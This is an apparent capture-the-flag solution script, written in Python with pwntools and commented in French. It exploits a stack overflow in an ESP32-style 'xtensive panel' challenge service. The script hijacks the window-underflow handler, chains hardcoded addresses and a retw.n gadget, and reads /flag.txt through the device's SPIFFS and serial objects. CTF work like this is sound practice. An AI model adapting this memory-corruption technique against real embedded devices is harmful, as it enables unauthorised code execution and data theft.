#!/usr/bin/env python3

from pwn import *

context.log_level = 'info'
context.bits = 32

if args.REMOTE:
    # remote docker
    io = remote("xtensive-panel-7.chall.ctf.bzh", 1337)
else:
    # IDF.py met le port 5555 en écoute quand on débug avec gdb
    io = remote("localhost", 5555)

# pwn here
context.log_level = 'info'
io.sendlineafter(b'panel>', b'shutdown')

offset_bsa = 46

payload = b'sup3rl33tp4ssw0rd\x00'
retwn = 0x400e04ab

# En modifiant le bit de poid fort de l'addresse de notre jump sur read_file on change
# le handler d'underflow qui nous permet de prendre le contrôle du programme de WindowUnderflow4 à WindowUnderflow8
# ce qui nous permet d'avoir plus de contrôle sur les registres
read_file = 0x800e01d4

# Objets extraits de la mémoire (il n'y a pas de randomization des addresses sur ce genre de systèmes donc tout est constant)
spiffs_obj = 0x3ffb3778
serial0 = 0x3ffb3640

payload += flat({
    offset_bsa: [
        p32(read_file),  # On jump au milieu de la fonction readConfiguration après buildPath pour injecter notre propre path /flag.txt valide
        p32(0x3ffb7e70), # a1 => pointe vers la prochaine stack frame + 16
        p32(0x3ffb7e70), # /flag.txt
        p32(serial0),    # Pour éviter le crash sur le print du flag il faut un objet serial valide et qui pointe vers notre sortie console

        p32(retwn),      # Juste un gadget retw.n
        p32(0x3ffb7e70), # Pointeur valide qui fait pas crash puisqu'il pointe vers sa propre frame + 16 donc la frame est valide :')
        p32(0xdeadbeef), # Placeholder
        p32(spiffs_obj), # Un peu pareil que pour le serial, l'objet SPIFFS est utilisé pour load la partition file system avec /flag.txt donc éssentiel à l'exploit

        b'/flag.txt' # 0x3ffb7e70 pointe ici ! 
    ]
})


io.sendlineafter(b': ', b'admin\x00')
io.sendlineafter(b': ', payload)

io.recvuntil(b'panel> ')
data = io.recvuntil(b'}') # Avoid potential undecodable junk after flag

info("extracted from memory : " + data.decode())

# Pas d'interactive (on se fou pas mal du crash dump)
io.close()
